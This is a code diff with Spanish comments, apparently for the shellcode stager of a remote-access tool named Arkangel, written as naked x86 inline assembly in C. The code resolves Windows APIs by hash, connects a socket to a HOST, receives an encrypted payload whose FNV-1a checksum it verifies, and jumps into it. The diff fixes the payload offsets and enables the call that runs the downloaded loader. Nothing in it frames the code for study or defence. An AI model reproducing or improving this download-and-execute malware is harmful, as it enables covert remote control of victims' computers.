@@ -19,7 +19,7 @@ void __declspec(naked) main(){
         /*###############################################################################
         ** Constantes:
         **    Aquí se declaran las constantes utilizadas en el código{
-        **        IP        : Dónde se conectará el socket
+        **        HOST      : Dónde se conectará el socket
         **        KEY       : Utilizado para identificar al cliente en el 'handshake'
         **        HASHES    : Hashes de las APIs de las que se obtendrá la dirección.
         **    }
@@ -174,7 +174,8 @@ find_kernel32_finished:
         pushc('_2sw')                   //v Metemos el nombre del API en el stack (ANSI)
         push esp                        //v
         call ebx                        //>LoadLibraryA("ws2_32");
-        add  esp, 0x8                   //Restauramos la pila sacando la cadena ANSI
+        pop  edx                        //v
+        pop  edx                        //>Restauramos la pila sacando la cadena ANSI
         pop  ecx
 
         //Cargamos las APIs de ws2_32 en la pila a partir de los hashes
@@ -313,12 +314,12 @@ connected:
         ** Recepción de datos desde el cliente:
         **  Una vez establecida la conexión con éxito intentamos recibir 
         **  el paquete inicial compuesto de:
-        **      IV+SizePlayload+offset_basis+LOADER_IAT+CARGADOR
+        **      IV+SizePayload+offset_basis+LOADER_IAT+CARGADOR
         **  Siendo cada uno:
         **      *IV(16bytes)    : Vector de inicializacion para el cifrado
         **{{
-        **      *offset_basis   : offset_basis de todo el paquete a partir del IV, para evitar error crítico al ejecutar.
-        **      *SizePayload    : sizeof(LOADER_IAT+CARGADOR)
+        **      *offset_basis   : offset_basis de todo el paquete a partir del SizePayload, para evitar error crítico al ejecutar.
+        **      *SizePayload    : sizeof(LOADER_IAT+CARGADOR+4)
         **      *LOADER_IAT     : Loader de Arkangel encargado de ubicar y ejecutar el cargador de plugins
         **      *CARGADOR       : Cargador de plugins... encargado de gestionar la conexión
         **}}
@@ -408,9 +409,10 @@ init_decrypt:
         **     el checksum de los datos éste sea 0.
         *###############################################################################*/
 
-        mov  ecx, [ebp+_buffLen]        //ECX = buffLen
         mov  esi, [ebp+_pBuff]          //ESI = pBuff
-        add  esi, (16 + 4)              //ESI+= (16 + 4) (Saltamos IV y offset_basis)
+        add  esi, 4                     //ESI+= 4 (saltamos offset_basis)
+        mov  ecx, [esi]                 //ECX = SizePayload
+        add  ecx, 4
 
         mov  edx, [esi-4]               //hash = offset_basis
 FNV1a:
@@ -425,13 +427,13 @@ FNV1a:
         //Si el checksum no devuelve 0 algo falla en el checksum... reseteemos la conexión
 
         //AUN POR DETERMINAR
-NoErr4: /*pushr(HASH)                   //v
+NoErr4: pushr(KEY)                      //v
         push [ebp+_hSocket]             //v
         push [ebp+_GetProcAddress]      //v
         push [ebp+_LoadLibraryA]        //v
         mov  eax, [ebp+_pBuff]          //v
         add  eax, 0x4                   //v
-        call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &HASH);*/
+        call eax                        //>cargador_IAT(&LoadLibraryA, &GetProcAddress, hSocket, &KEY);*/
     }
 }
 
